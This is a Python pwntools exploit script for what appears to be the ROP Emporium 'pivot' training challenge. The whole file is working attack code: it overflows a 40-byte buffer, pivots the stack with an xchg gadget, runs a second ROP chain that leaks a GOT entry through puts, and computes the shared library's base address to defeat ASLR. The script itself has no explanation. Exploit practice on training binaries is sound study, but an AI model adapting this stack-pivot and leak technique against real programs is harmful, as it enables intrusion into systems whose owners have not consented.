from pwn import *
exe = context.binary = ELF("./pivot")
lib_cus = ELF("./libpivot.so")
r = process()
offset = 40
rop1 = ROP(exe)
r.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
stack = int(r.recvline().strip().decode(),16)
log.info(f"Stack {hex(stack)}")
xchg_rax_rsp = 0x00000000004009bd
rop1.raw(b"A" * offset)
rop1.rax = stack
rop1.raw(xchg_rax_rsp)
rop2 = ROP(exe)
rop2.raw(exe.plt['foothold_function'])
rop2.rdi = exe.got['foothold_function']
rop2.raw(exe.plt['puts'])
rop2.rax = exe.got['foothold_function']
rop2.rbp = 0x117
mov_rax_qwordrax = 0x00000000004009c0
rop2.raw(mov_rax_qwordrax)
add_rax_rbp = 0x00000000004009c4
rop2.raw(add_rax_rbp)
call_rax = 0x00000000004006b0
rop2.raw(call_rax)
r.sendline(rop2.chain())
r.sendline(rop1.chain())
r.recvuntil(b"foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n")
leak_foot = u64(r.recvline().strip() + b"\x00\x00")
lib_cus.address = leak_foot - lib_cus.sym['foothold_function']
log.info(f"Leak Foot {hex(leak_foot)}")
log.info(f"Lib_Custom BASE {hex(lib_cus.address)}")
log.info(f"Ret2win {hex(lib_cus.sym['ret2win'])}")
r.interactive()